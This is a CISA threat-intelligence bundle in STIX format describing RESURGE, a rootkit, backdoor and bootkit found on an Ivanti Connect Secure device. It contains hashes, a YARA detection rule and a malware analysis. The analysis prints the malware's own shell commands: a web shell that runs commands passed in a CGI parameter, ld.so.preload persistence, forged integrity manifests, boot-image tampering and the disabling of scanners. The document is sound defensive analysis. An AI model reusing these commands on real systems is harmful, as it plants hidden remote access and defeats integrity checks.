{
    "type": "bundle",
    "id": "bundle--18aa5cf7-a596-4697-aeac-017de24f088c",
    "objects": [
        {
            "type": "marking-definition",
            "spec_version": "2.1",
            "id": "marking-definition--d896763f-3f6f-4917-86e8-1a4b043d9771",
            "created": "2023-08-11T15:46:15.983Z",
            "extensions": {
                "extension-definition--3a65884d-005a-4290-8335-cb2d778a83ce": {
                    "access_privilege": [
                        {
                            "privilege_action": "CISAUSES",
                            "privilege_scope": {
                                "entity": [
                                    "ALL"
                                ],
                                "permitted_nationalities": [
                                    "ALL"
                                ],
                                "permitted_organizations": [
                                    "ALL"
                                ],
                                "shareability": [
                                    "ALL"
                                ]
                            },
                            "rule_effect": "permit"
                        }
                    ],
                    "authority_reference": [
                        "urn:isa:authority:ais"
                    ],
                    "control_set": {
                        "classification": "U",
                        "formal_determination": [
                            "INFORMATION-DIRECTLY-RELATED-TO-CYBERSECURITY-THREAT",
                            "PUBREL"
                        ]
                    },
                    "create_date_time": "2023-08-11T15:46:15.983Z",
                    "extension_type": "property-extension",
                    "further_sharing": [
                        {
                            "sharing_scope": [
                                "USA.USG"
                            ],
                            "rule_effect": "permit"
                        }
                    ],
                    "identifier": "isa:guide.19001.GEMINI-a9bdb603-7f4f-44c6-acb0-d47f614e64b2",
                    "policy_reference": "urn:isa:policy:acs:ns:v3.0?privdefault=deny&sharedefault=deny",
                    "responsible_entity_custodian": "USA.DHS.CISA.CSD.TH.CMA",
                    "responsible_entity_originator": "USA.DHS.CISA.CSD.TH.CMA"
                }
            }
        },
        {
            "type": "identity",
            "spec_version": "2.1",
            "id": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
            "created_by_ref": "identity--42ac3c92-60d2-418f-ba8e-838944e6110b",
            "created": "2023-04-12T17:53:09.646Z",
            "modified": "2023-04-12T17:53:09.646Z",
            "name": "GeminiProduction_CMA",
            "description": "Cybersecurity and Infrastructure Security Agency Production Identity. Code and Media Analysis.",
            "identity_class": "system",
            "confidence": 100,
            "lang": "en",
            "object_marking_refs": [
                "marking-definition--bab4a63c-aed9-4cf5-a766-dfca5abac2bb"
            ]
        },
        {
            "type": "file",
            "spec_version": "2.1",
            "id": "file--cc6b60ae-35ae-5163-ab04-1de8acdff2a0",
            "hashes": {
                "MD5": "cfb263a731d51ff489168bbca0d3bd2f",
                "SHA-1": "87bcbbcb878aeee6ad4463464745770e95c6a937",
                "SHA-256": "52bbc44eb451cb5e16bf98bc5b1823d2f47a18d71f14543b460395a1c1b1aeda",
                "SHA-512": "3d12fdb707c188eb2e94cbf2dd42a50cfe343128652bab9245a54b887e35bc32c6a88c8faa5001a045df3991b387fcd6a27719ecbf84f6ce893163b040c2e0dd",
                "SSDEEP": "24576:h6j7Ed+iowSCstJtmOKSbqUmtzYxs7X0ToN8fp/AQClBka:h4wSC0JtmpntzYMU2"
            },
            "size": 1414480,
            "name": "libdsupgrade.so",
            "object_marking_refs": [
                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487",
                "marking-definition--d896763f-3f6f-4917-86e8-1a4b043d9771"
            ]
        },
        {
            "type": "indicator",
            "spec_version": "2.1",
            "id": "indicator--1be1cc0b-e498-44f1-ad81-65af0f3e8a2f",
            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
            "created": "2025-03-28T13:57:31.000Z",
            "modified": "2025-03-28T13:57:31.000Z",
            "name": "libdsupgrade.so",
            "object_marking_refs": [
                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487",
                "marking-definition--d896763f-3f6f-4917-86e8-1a4b043d9771"
            ],
            "description": "The file 'libdsupgrade.so' is a malicious 32-bit Linux Shared Object file that was extracted from an Ivanti Connect Secure device version 22.7.4.30859. The file contains capabilities of a rootkit, dropper, backdoor, bootkit, proxy, and tunneler. The file shares similar functionality to SPAWNCHIMERA malware however, this file contains a series of commands that modify files, manipulates integrity checks, and creates a web shell that is copied to the running Ivanti boot disk. CISA is calling this variant RESURGE.\r\n\r\nThe similarities to SPAWNCHIMERA are as follows. RESURGE checks if the file is loaded by a program called 'web' or 'dsmdm' (Figure 1).\r\n\r\nIf the 'web' program is called, it hooks accept and strncpy. It contains an embedded private key, which is Exclusive Or (XOR) encrypted, so the Threat Actor (TA) can connect to it with their public key. This proxy does not use encryption, it uses the decoding function (Figure 2). It uses tunneling to look for an Internet Protocol (IP) and data and decodes the data received which will then be funneled through the proxy. The hooked strncpy is modified to limit the copied data to 256 bytes. This is achieved by checking the web program is running within a specified address range, the bytes are not larger than 256, and the bytes do not begin with a specific byte pattern (Figure 3). The TA connects to the tunneler, which can also communicate with the file 'me/runtime/tmp/.logsrv'. When it receives traffic it will funnel to the file, where the TA can then communicate with the system via a secure shell.\r\n\r\nIf the 'dsmdm' program is called, it creates a thread for a secure shell via SSH to the system. It doesn't bind to a port but rather binds to a file called 'me/runtime/tmp/.logsrv' and listens for connections, giving the TA a secure socket shell to the system (Figure 4). In order for the TA to access the shell, they need to access the file. Another thread is also created to drop the file 'liblogblock.so' to the '/tmp' directory. It creates a handle to the 'proc' folder, enumerating through it looking for the 'dslogserver' process. It interacts with 'dslogserver' through shared memory to read from or write to the memory it is using. It checks whether the dslogserver is up. If not, it sleeps for 10 seconds and then checks again. This behavior continues in a loop until the server is detected, at which time it will try to load a shared object file called '/tmp/.liblogblock.so' (Figure 5).\r\n\r\nRESURGE contains a series of commands that have been broken down and perform the following functionality:\r\n\r\nCommands 1: Inserts itself into 'ld.so.preload', sets up a web shell for remote command execution within the 'compcheckresult.cgi' file, fakes integrity checks, and generates keys against the modified files to sign the manifest file so they appear legitimate (Figure 6).\r\n\r\nCommands 2: Decrypts, modifies, and re-encrypts coreboot Random Access Memory (RAM) disk (Figure 7). \r\n\r\nCommands 3: Uses system() to execute several sed commands. These commands modify the contents of two Python files ('scanner.py' and 'scanner_legacy.py') by searching for particular lines and replacing them with new one which, if successful, will result in the scanning scripts no longer keeping track of mismatches or new files (Figure 8).\r\n\r\n---Begin Commands 1---\r\n/bin/sed -i '/echo_console \\\"Saving package\\\"/i\r\n\t-Searches for the string echo_console \"Saving package\" and enters the following commands before it:\r\n\r\ncp /lib/%s /tmp/data/root/lib\r\n\t-Copies itself to '/tmp/data/root/lib'.\r\n\t\r\ncp /home/venv3/lib/python3.6/site-packages/scanner-0.1-py3.6.egg /tmp/data/root/home/venv3/lib/python3.6/site-packages/scanner-0.1-py3.6.egg\r\n\t-Copies a Python package 'scanner-0.1-py3.6.egg' to /tmp/data/root/home/venv3/lib/....\r\n\r\necho \"/lib/%s \"`/home/bin/openssl dgst -sha256 /lib/%s|cut -d \" \"-f 2` b\\\" >> /tmp/data/root/home/etc/manifest/manifest\r\n\t-Calculates a SHA-256 hash for itself  using openssl dgst. The result is appended to the 'manifest' file.\r\n\t\r\nsed -i \"1i/lib/%s\" /tmp/data/root/etc/ld.so.preload\r\n\t-This inserts itself to the beginning of the 'ld.so.preload' file.\r\n\t\r\ntouch /tmp/data/root/etc/ld.so.preload \r\n\t-Updates the timestamp of the 'ld.so.preload' file.\r\n\t\r\nsed -i \"/ENV{\\\"DSINSTALL_CLEAN\\\"} = $clean;/a \\\\$ENV{\\\"LD_PRELOAD\\\"} = \\\"%s\\\";\" /tmp/data/root/home/perl/DSUpgrade.pm \r\n\t-Adds a new line after the pattern ENV{\"DSINSTALL_CLEAN\"} = $clean; in the 'DSUpgrade.pm' file. Then sets the environment variable LD_PRELOAD to %s ensuring the library is preloaded when the script is run.\r\n\t\r\nsed -i \"/popen(*FH, \\$prog);/a \\\\$ENV{\\\"LD_PRELOAD\\\"} = \\\"\\\";\" /tmp/data/root/home/perl/DSUpgrade.pm\r\n\t-Searches for the string \"/popen(*FH, \\$prog);/\" in the 'DSUpgrade.pm' file and then adds the line $ENV{\"LD_PRELOAD\"} = \"\"; after popen(...);. It clears the 'LD_PRELOAD' environment variable of all preloaded libraries after the 'DSUpgrade.pm' file executes.\r\n\t\r\nsed -i \"s/DSUpgrade.pm \\w{64}/DSUpgrade.pm `/home/bin/openssl dgst -sha256 /tmp/data/root/home/perl/DSUpgrade.pm | cut -d \\\" \\\" -f 2` \\\" /tmp/data/root/home/etc/manifest/manifest \r\n\t-Searches for the  SHA-256 checksum for 'DSUpgrade.pm' in the 'manifest' file. It uses openssl dgst to calculate the hash of DSUpgrade.pm and replaces the old value with this hash.\r\n\t\r\nsed -i \"/main();/I if(CGI::param(\\\"vXm8DtMJG\\\")){\\n\\\\ print \\\"Cache-Control: no-cache\\\\n\\\"; \\n\\\\ print \\\"Content-type: text/html\\\\n\\\\\\n\\\"; \\n\\\\ my \\$a=CGI::param(\\\"vXm8DtMJG\\\");\\n\\\\ system(\\\"$a\\\");\\n}\" /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckresult.cgi\r\n\t-This inserts Perl code before the main(); function in the file 'compcheckresult.cgi'. It checks for the parameter \"vXm8DtMJG\" and, if it exists, runs a command provided by the attacker through the web server \r\n\t\r\nsed -i \"s/compcheckresult.cgi \\w{64}/compcheckresult.cgi `/home/bin/openssl dgst -sha256 \"/tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckresult.cgi | cut -d \\\" \\\" -f 2` \\\" /tmp/data/root/home/etc/manifest/manifest \r\n\t-Similar to the earlier command, it replaces the old 'compcheckresult.cgi' with the new SHA-256 hash inside the 'manifest' file.\r\n\t\r\nsed -i \"s/exit 1/exit 0/g\\\" /tmp/data/root/home/bin/check_integrity.sh\r\n\t-This command replaces all instances of exit 1 with exit 0 in 'check_integrity.sh'. This ensures that the script does not exit with an error.\r\n\r\nsed -i \\\"s/check_integrity.sh \\w{64}/check_integrity.sh `/home/bin/openssl dgst -sha256 /tmp/data/root/home/bin/check_integrity.sh | cut -d \\\" \\\" -f 2`/\\\" /tmp/data/root/home/etc/manifest/manifest\r\n\t-Similar to the earlier command, it replaces the old 'check_integrity.sh' with the new SHA-256 hash inside the 'manifest' file.\r\n\t\r\n/home/bin/openssl genrsa -out private.pem 2048 \r\n\t-This generates a 2048-bit RSA private key and saves it in 'private.pem'.\r\n\t\r\n/home/bin/openssl rsa -in private.pem -out manifest.2 -outform PEM -pubout\r\n\t-This command extracts the public key from the 'private.pem' file and saves it as 'manifest.2'.\r\n\t\r\n/home/bin/openssl dgst -sha512 -sign private.pem -out manifest.1 /tmp/data/root/home/etc/manifest/manifest \r\n\t-This signs the manifest file using the private key generating a SHA-512 signature and saving it as 'manifest.1'.\r\n\t\r\nmv manifest.1 manifest.2 /tmp/data/root/home/etc/manifest/\r\n\t-Moves the signed manifest files (manifest.1 and manifest.2) into the '/tmp/data/root/home/etc/manifest/' directory\r\n\t\r\nrm -f private.pem' ./do-install\";\r\n\t-Deletes the private key file and finally executes the script 'do-install'.\r\n---End Commands 1---\r\n------------------------------------------------------------------------------------------\r\n---Begin Commands 2---\r\nsed -i '/\\\\/bin\\\\/cp \\\\/tmp\\\\/data\\\\/root\\\\/\\\\${kerndir}\\\\/coreboot.img \\\\/tmp\\\\/data\\\\/boot\\\\//i\\\\\\n\"\r\n\tModifies `/tmp/installer/do-install-coreboot by adding the following commands before the line \"/bin/cp /tmp/data/root/${kerndir}/coreboot.img /tmp/data/boot/\"\r\n\t\r\n/bin/mkdir /tmp/new_img\r\n\tCreate a new directory '/tmp/new_img'.\r\n\t\r\n/bin/dsmain -g\r\n\tExecute dsmain with the -g argument\r\n\t\r\n/bin/sh /tmp/extract_vmlinux.sh /tmp/data/root/${kerndir}/bzImage > /tmp/new_img/vmlinux\"\r\n\tExecutes a shell script 'extract_vmlinux.sh' against 'bzImage' and saves the output to '/tmp/new_img/vmlinux'.\r\n\t\r\n/bin/rm /tmp/extract_vmlinux.sh\r\n\tDeletes 'extract_vmlinux.sh'.\r\n\t\r\noutput=$(/bin/dsmain strings -t x /tmp/new_img/vmlinux | grep \\\"Linux version \\\")\r\n\tDeclares the variable $output. Searches for the string 'Linux Version' inside the 'vmlinux' file while preserving its hex offsets and saves the memory address of the string to $output.\r\n\t\r\noffset=\\\"0x\\\"$(echo $output | awk '\\\"'\\\"'{print $1}'\\\"'\\\"')\r\n\tDeclares the $offset variable. Extracts the hex offset from $output and prefixes it with 0x.\r\n\t\r\noffset=$((offset + 0xc0))\r\n\tAdds 0xc0 hex (192 decimal) to the offset current value and saves it in $offset.\r\n\t\r\nkey=$(/bin/dsmain xxd -s \\\"$offset\\\" -l 16 -p /tmp/new_img/vmlinux)\r\n\tDeclares the $key variable. It reads 16 bytes from $offset using 'xxd'. These 16 bytes are then stored as hex in the $key.\r\n\t\r\n/bin/dsmain -d /tmp/data/root/${kerndir}/coreboot.img /tmp/new_img/coreboot.img.1.gz $key\r\n\tExecutes dsmain with the -d argument to decrypt 'coreboot.img' using the extracted $key and stores the output as 'coreboot.img.1.gz'\r\n\t\r\n/bin/mkdir /tmp/coreboot_fs\r\n\tMakes a new directory '/tmp/coreboot_fs'.\r\n\t\r\n/bin/dsmain gunzip /tmp/new_img/coreboot.img.1.gz -c > /tmp/coreboot_fs/coreboot.img.1\r\n\tExecutes dsmain to decompress 'coreboot.img.1.gz' into 'coreboot.img.1' within the new directory.\r\n\t\r\ncd /tmp/coreboot_fs\r\n\tChanges into the '/tmp/coreboot_fs' directory.\r\n\t\r\n/bin/dsmain cpio -idvm < coreboot.img.1\r\n\tExecutes dsmain with cpio -idvm to extract the compressed 'coreboot.img.1'.\r\n\t\r\n/bin/rm coreboot.img.1\r\n\tDeletes 'coreboot.img.1'.\r\n\t\r\ncp /bin/dsmain /tmp/coreboot_fs/bin/dsmain\r\n\tCopies dsmain into the 'coreboot_fs' directory.\r\n\t\r\ncp /lib/%s /tmp/coreboot_fs/lib/%s\r\n\tCopies itself into the 'coreboot_fs' directory.\r\n\t\r\ncp /home/venv3/lib/python3.6/site-packages/scanner-0.1-py3.6.egg /tmp/coreboot_fs/bin/scanner-0.1-py3.6.egg\r\n\tCopies the python package 'scanner-0.1-py3.6.egg' into the 'coreboot_fs' directory.\r\n\t\r\n/bin/sed -i rollback_on_error $? \"Extracting Package\"\r\n\tModifies the boot process by adding the below commands to the file '/tmp/coreboot_fs/bin/init' below the line 'rollback_on_error $? \"Extracting Package\".\r\n\t\r\n/bin/dsmain touch /etc/ld.so.preload\r\n\tExecute dsmain with touch '/etc/ld.so.preload' to update the access and modified time to the current time.\r\n\t\r\n/bin/dsmain sed -I \"1i/lib/%s\" /home/root/etc/ld.so.preload\r\n\tAdds itself to the top of 'ld.so.preload'.\r\n\t\r\n/bin/cp /bin/dsmain /home/root/bin/dsmain\r\n\tCopy dsmain into the 'root/bin' directory.\r\n\t\r\n/bin/cp /bin/scanner-0.1-py3.6.egg /home/root/home/venv3/lib/python3.6/site-packages/scanner-0.1-py3.6.egg\r\n\tCopy 'scanner-0.1-py3.6.egg' into a 'root' directory.\r\n\t\r\n/bin/cp /lib/%s /home/root/lib/%s\r\n\tCopy itself into the 'root/lib' directory.\r\n\t\r\n\"\\\" /tmp/coreboot_fs/bin/init\r\n\tThe boot process files being modified with the above commands.\r\n\t\r\n/bin/dsmain find . -print | /bin/dsmain cpio -o -H newc > /tmp/coreboot_fs/coreboot.img.1\r\n\tExecute dsmain to repackage the modified 'coreboot.img'.\r\n\t\r\n/bin/dsmain gzip /tmp/coreboot_fs/coreboot.img.1\r\n\tExecute dsmain to compress the modified 'coreboot.img'.\r\n\t\r\n/bin/dsmain -e /tmp/coreboot_fs/coreboot.img.1.gz /tmp/data/root/${kerndir}/coreboot.img  $key\r\n\tExecute dsmain to encrypt the modified 'coreboot.img'.\r\n\t\r\nrm -rf /tmp/coreboot_fs'\r\n\tDelete the '/tmp/coreboot_fs' directory.\r\n\r\n/tmp/installer/do-install-coreboot\r\n\tThe file being modified with the commands.\r\n---End Commands 2---\r\n------------------------------------------------------------------------------------------\r\n---Begin Commands 3---\r\nsystem(\"sed -i 's/mismatchCount += 1/pass/g' scripts/scanner.py\");\r\n\tReplace the 'mismatchCount += 1' with 'pass' in 'scanner.py'.\r\n\t\r\nsystem(\"sed -i 's/mismatchedFiles.append(file)/ /g' scripts/scanner.py\");\r\n\tReplace the 'mismatchedFiles.append(file)' with a blank space in 'scanner.py'.\r\n\t\r\nsystem(\"sed -i 's/newFilesCount += 1/pass/g' scripts/scanner.py\");\r\n\tReplace 'newFilesCount += 1' with 'pass' in 'scanner.py'.\r\n\t\r\nsystem(\"sed -i 's/newFilesDetected.append(file)/ /g' scripts/scanner.py\");\r\n\tReplace 'newFilesDetected.append(file)' with a blank space in 'scanner.py'.\r\n\t\r\nsystem(\"sed -i 's/mismatchCount += 1/pass/g' scripts/scanner_legacy.py\");\r\n\tReplace the 'mismatchCount += 1' with 'pass' in 'scanner_legacy.py'.\r\n\t\r\nsystem(\"sed -i 's/mismatchedFiles.append(file)/ /g' scripts/scanner_legacy.py\");\r\n\tReplace the 'mismatchedFiles.append(file)' with a blank space in 'scanner_legacy.py'.\r\n\t\r\nsystem(\"sed -i 's/newFilesCount += 1/pass/g' scripts/scanner_legacy.py\");\r\n\tReplace 'newFilesCount += 1' with 'pass' in 'scanner_legacy.py'.\r\n\t\r\nsystem(\"sed -i 's/newFilesDetected.append(file)/ /g' scripts/scanner_legacy.py\");\r\n\tReplace 'newFilesDetected.append(file)' with a blank space in 'scanner_legacy.py'.\r\n---End Commands 3---",
            "indicator_types": [
                "malicious-activity"
            ],
            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_25993211_01 rule_content=rule CISA_25993211_01 : RESURGE backdoor dropper rootkit bootkit \n{\n   meta:\n      author = \"CISA Code & Media Analysis\"\n      incident = \"25993211\"\n      date = \"2025-03-03\"\n      last_modified = \"20250303_1446\"\n      actor = \"n/a\"\n      family = \"SPAWN\"\n      capabilities = \"n/a\"\n      malware_type = \"backdoor dropper rootkit bootkit\"\n      tool_type = \"unknown\"\n      description = \"Detects RESURGE malware samples\"\n      sha256_1 = \"52bbc44eb451cb5e16bf98bc5b1823d2f47a18d71f14543b460395a1c1b1aeda\"\n  strings:\n      $s1 = \"snprintf\"\n      $s2 = \"CGI::param\"\n      $s3 = \"coreboot.img\" \n      $s4 = \"scanner.py\" \n      $s5 = { 6C 6F 67 73 }\n      $s6 = \"accept\"\n      $s7 = \"strncpy\"\n      $s8 = \"dsmdm\" \n      $s9 = \"funchook_create\" \n      $s10 = { 20 83 B8 ED }\n   condition:\n      all of them\n}\n",
            "pattern_type": "yara",
            "valid_from": "2025-03-28T17:39:13.024759Z"
        },
        {
            "type": "malware-analysis",
            "spec_version": "2.1",
            "id": "malware-analysis--1bef896c-da86-4402-afc4-c2943deb3378",
            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
            "created": "2025-03-28T13:57:31.000Z",
            "modified": "2025-03-28T13:57:31.000Z",
            "product": "eset",
            "object_marking_refs": [
                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487",
                "marking-definition--d896763f-3f6f-4917-86e8-1a4b043d9771"
            ],
            "result_name": "a variant of Linux/SpawnSnail.A trojan",
            "result": "unknown",
            "sample_ref": "file--cc6b60ae-35ae-5163-ab04-1de8acdff2a0"
        },
        {
            "type": "malware-analysis",
            "spec_version": "2.1",
            "id": "malware-analysis--dc2526bf-7a47-4372-8f6f-a3f8ba6c503a",
            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
            "created": "2025-03-28T13:57:31.000Z",
            "modified": "2025-03-28T13:57:31.000Z",
            "product": "netgate",
            "object_marking_refs": [
                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487",
                "marking-definition--d896763f-3f6f-4917-86e8-1a4b043d9771"
            ],
            "result_name": "Unavailable (production)",
            "result": "unknown",
            "sample_ref": "file--cc6b60ae-35ae-5163-ab04-1de8acdff2a0"
        },
        {
            "type": "malware",
            "spec_version": "2.1",
            "id": "malware--97009956-847c-480d-89ab-3047951b795e",
            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
            "created": "2025-03-28T13:57:31.000Z",
            "modified": "2025-03-28T13:57:31.000Z",
            "object_marking_refs": [
                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487",
                "marking-definition--d896763f-3f6f-4917-86e8-1a4b043d9771"
            ],
            "description": "The file 'libdsupgrade.so' is a malicious 32-bit Linux Shared Object file that was extracted from an Ivanti Connect Secure device version 22.7.4.30859. The file contains capabilities of a rootkit, dropper, backdoor, bootkit, proxy, and tunneler. The file shares similar functionality to SPAWNCHIMERA malware however, this file contains a series of commands that modify files, manipulates integrity checks, and creates a web shell that is copied to the running Ivanti boot disk. CISA is calling this variant RESURGE.\r\n\r\nThe similarities to SPAWNCHIMERA are as follows. RESURGE checks if the file is loaded by a program called 'web' or 'dsmdm' (Figure 1).\r\n\r\nIf the 'web' program is called, it hooks accept and strncpy. It contains an embedded private key, which is Exclusive Or (XOR) encrypted, so the Threat Actor (TA) can connect to it with their public key. This proxy does not use encryption, it uses the decoding function (Figure 2). It uses tunneling to look for an Internet Protocol (IP) and data and decodes the data received which will then be funneled through the proxy. The hooked strncpy is modified to limit the copied data to 256 bytes. This is achieved by checking the web program is running within a specified address range, the bytes are not larger than 256, and the bytes do not begin with a specific byte pattern (Figure 3). The TA connects to the tunneler, which can also communicate with the file 'me/runtime/tmp/.logsrv'. When it receives traffic it will funnel to the file, where the TA can then communicate with the system via a secure shell.\r\n\r\nIf the 'dsmdm' program is called, it creates a thread for a secure shell via SSH to the system. It doesn't bind to a port but rather binds to a file called 'me/runtime/tmp/.logsrv' and listens for connections, giving the TA a secure socket shell to the system (Figure 4). In order for the TA to access the shell, they need to access the file. Another thread is also created to drop the file 'liblogblock.so' to the '/tmp' directory. It creates a handle to the 'proc' folder, enumerating through it looking for the 'dslogserver' process. It interacts with 'dslogserver' through shared memory to read from or write to the memory it is using. It checks whether the dslogserver is up. If not, it sleeps for 10 seconds and then checks again. This behavior continues in a loop until the server is detected, at which time it will try to load a shared object file called '/tmp/.liblogblock.so' (Figure 5).\r\n\r\nRESURGE contains a series of commands that have been broken down and perform the following functionality:\r\n\r\nCommands 1: Inserts itself into 'ld.so.preload', sets up a web shell for remote command execution within the 'compcheckresult.cgi' file, fakes integrity checks, and generates keys against the modified files to sign the manifest file so they appear legitimate (Figure 6).\r\n\r\nCommands 2: Decrypts, modifies, and re-encrypts coreboot Random Access Memory (RAM) disk (Figure 7). \r\n\r\nCommands 3: Uses system() to execute several sed commands. These commands modify the contents of two Python files ('scanner.py' and 'scanner_legacy.py') by searching for particular lines and replacing them with new one which, if successful, will result in the scanning scripts no longer keeping track of mismatches or new files (Figure 8).\r\n\r\n---Begin Commands 1---\r\n/bin/sed -i '/echo_console \\\"Saving package\\\"/i\r\n\t-Searches for the string echo_console \"Saving package\" and enters the following commands before it:\r\n\r\ncp /lib/%s /tmp/data/root/lib\r\n\t-Copies itself to '/tmp/data/root/lib'.\r\n\t\r\ncp /home/venv3/lib/python3.6/site-packages/scanner-0.1-py3.6.egg /tmp/data/root/home/venv3/lib/python3.6/site-packages/scanner-0.1-py3.6.egg\r\n\t-Copies a Python package 'scanner-0.1-py3.6.egg' to /tmp/data/root/home/venv3/lib/....\r\n\r\necho \"/lib/%s \"`/home/bin/openssl dgst -sha256 /lib/%s|cut -d \" \"-f 2` b\\\" >> /tmp/data/root/home/etc/manifest/manifest\r\n\t-Calculates a SHA-256 hash for itself  using openssl dgst. The result is appended to the 'manifest' file.\r\n\t\r\nsed -i \"1i/lib/%s\" /tmp/data/root/etc/ld.so.preload\r\n\t-This inserts itself to the beginning of the 'ld.so.preload' file.\r\n\t\r\ntouch /tmp/data/root/etc/ld.so.preload \r\n\t-Updates the timestamp of the 'ld.so.preload' file.\r\n\t\r\nsed -i \"/ENV{\\\"DSINSTALL_CLEAN\\\"} = $clean;/a \\\\$ENV{\\\"LD_PRELOAD\\\"} = \\\"%s\\\";\" /tmp/data/root/home/perl/DSUpgrade.pm \r\n\t-Adds a new line after the pattern ENV{\"DSINSTALL_CLEAN\"} = $clean; in the 'DSUpgrade.pm' file. Then sets the environment variable LD_PRELOAD to %s ensuring the library is preloaded when the script is run.\r\n\t\r\nsed -i \"/popen(*FH, \\$prog);/a \\\\$ENV{\\\"LD_PRELOAD\\\"} = \\\"\\\";\" /tmp/data/root/home/perl/DSUpgrade.pm\r\n\t-Searches for the string \"/popen(*FH, \\$prog);/\" in the 'DSUpgrade.pm' file and then adds the line $ENV{\"LD_PRELOAD\"} = \"\"; after popen(...);. It clears the 'LD_PRELOAD' environment variable of all preloaded libraries after the 'DSUpgrade.pm' file executes.\r\n\t\r\nsed -i \"s/DSUpgrade.pm \\w{64}/DSUpgrade.pm `/home/bin/openssl dgst -sha256 /tmp/data/root/home/perl/DSUpgrade.pm | cut -d \\\" \\\" -f 2` \\\" /tmp/data/root/home/etc/manifest/manifest \r\n\t-Searches for the  SHA-256 checksum for 'DSUpgrade.pm' in the 'manifest' file. It uses openssl dgst to calculate the hash of DSUpgrade.pm and replaces the old value with this hash.\r\n\t\r\nsed -i \"/main();/I if(CGI::param(\\\"vXm8DtMJG\\\")){\\n\\\\ print \\\"Cache-Control: no-cache\\\\n\\\"; \\n\\\\ print \\\"Content-type: text/html\\\\n\\\\\\n\\\"; \\n\\\\ my \\$a=CGI::param(\\\"vXm8DtMJG\\\");\\n\\\\ system(\\\"$a\\\");\\n}\" /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckresult.cgi\r\n\t-This inserts Perl code before the main(); function in the file 'compcheckresult.cgi'. It checks for the parameter \"vXm8DtMJG\" and, if it exists, runs a command provided by the attacker through the web server \r\n\t\r\nsed -i \"s/compcheckresult.cgi \\w{64}/compcheckresult.cgi `/home/bin/openssl dgst -sha256 \"/tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckresult.cgi | cut -d \\\" \\\" -f 2` \\\" /tmp/data/root/home/etc/manifest/manifest \r\n\t-Similar to the earlier command, it replaces the old 'compcheckresult.cgi' with the new SHA-256 hash inside the 'manifest' file.\r\n\t\r\nsed -i \"s/exit 1/exit 0/g\\\" /tmp/data/root/home/bin/check_integrity.sh\r\n\t-This command replaces all instances of exit 1 with exit 0 in 'check_integrity.sh'. This ensures that the script does not exit with an error.\r\n\r\nsed -i \\\"s/check_integrity.sh \\w{64}/check_integrity.sh `/home/bin/openssl dgst -sha256 /tmp/data/root/home/bin/check_integrity.sh | cut -d \\\" \\\" -f 2`/\\\" /tmp/data/root/home/etc/manifest/manifest\r\n\t-Similar to the earlier command, it replaces the old 'check_integrity.sh' with the new SHA-256 hash inside the 'manifest' file.\r\n\t\r\n/home/bin/openssl genrsa -out private.pem 2048 \r\n\t-This generates a 2048-bit RSA private key and saves it in 'private.pem'.\r\n\t\r\n/home/bin/openssl rsa -in private.pem -out manifest.2 -outform PEM -pubout\r\n\t-This command extracts the public key from the 'private.pem' file and saves it as 'manifest.2'.\r\n\t\r\n/home/bin/openssl dgst -sha512 -sign private.pem -out manifest.1 /tmp/data/root/home/etc/manifest/manifest \r\n\t-This signs the manifest file using the private key generating a SHA-512 signature and saving it as 'manifest.1'.\r\n\t\r\nmv manifest.1 manifest.2 /tmp/data/root/home/etc/manifest/\r\n\t-Moves the signed manifest files (manifest.1 and manifest.2) into the '/tmp/data/root/home/etc/manifest/' directory\r\n\t\r\nrm -f private.pem' ./do-install\";\r\n\t-Deletes the private key file and finally executes the script 'do-install'.\r\n---End Commands 1---\r\n------------------------------------------------------------------------------------------\r\n---Begin Commands 2---\r\nsed -i '/\\\\/bin\\\\/cp \\\\/tmp\\\\/data\\\\/root\\\\/\\\\${kerndir}\\\\/coreboot.img \\\\/tmp\\\\/data\\\\/boot\\\\//i\\\\\\n\"\r\n\tModifies `/tmp/installer/do-install-coreboot by adding the following commands before the line \"/bin/cp /tmp/data/root/${kerndir}/coreboot.img /tmp/data/boot/\"\r\n\t\r\n/bin/mkdir /tmp/new_img\r\n\tCreate a new directory '/tmp/new_img'.\r\n\t\r\n/bin/dsmain -g\r\n\tExecute dsmain with the -g argument\r\n\t\r\n/bin/sh /tmp/extract_vmlinux.sh /tmp/data/root/${kerndir}/bzImage > /tmp/new_img/vmlinux\"\r\n\tExecutes a shell script 'extract_vmlinux.sh' against 'bzImage' and saves the output to '/tmp/new_img/vmlinux'.\r\n\t\r\n/bin/rm /tmp/extract_vmlinux.sh\r\n\tDeletes 'extract_vmlinux.sh'.\r\n\t\r\noutput=$(/bin/dsmain strings -t x /tmp/new_img/vmlinux | grep \\\"Linux version \\\")\r\n\tDeclares the variable $output. Searches for the string 'Linux Version' inside the 'vmlinux' file while preserving its hex offsets and saves the memory address of the string to $output.\r\n\t\r\noffset=\\\"0x\\\"$(echo $output | awk '\\\"'\\\"'{print $1}'\\\"'\\\"')\r\n\tDeclares the $offset variable. Extracts the hex offset from $output and prefixes it with 0x.\r\n\t\r\noffset=$((offset + 0xc0))\r\n\tAdds 0xc0 hex (192 decimal) to the offset current value and saves it in $offset.\r\n\t\r\nkey=$(/bin/dsmain xxd -s \\\"$offset\\\" -l 16 -p /tmp/new_img/vmlinux)\r\n\tDeclares the $key variable. It reads 16 bytes from $offset using 'xxd'. These 16 bytes are then stored as hex in the $key.\r\n\t\r\n/bin/dsmain -d /tmp/data/root/${kerndir}/coreboot.img /tmp/new_img/coreboot.img.1.gz $key\r\n\tExecutes dsmain with the -d argument to decrypt 'coreboot.img' using the extracted $key and stores the output as 'coreboot.img.1.gz'\r\n\t\r\n/bin/mkdir /tmp/coreboot_fs\r\n\tMakes a new directory '/tmp/coreboot_fs'.\r\n\t\r\n/bin/dsmain gunzip /tmp/new_img/coreboot.img.1.gz -c > /tmp/coreboot_fs/coreboot.img.1\r\n\tExecutes dsmain to decompress 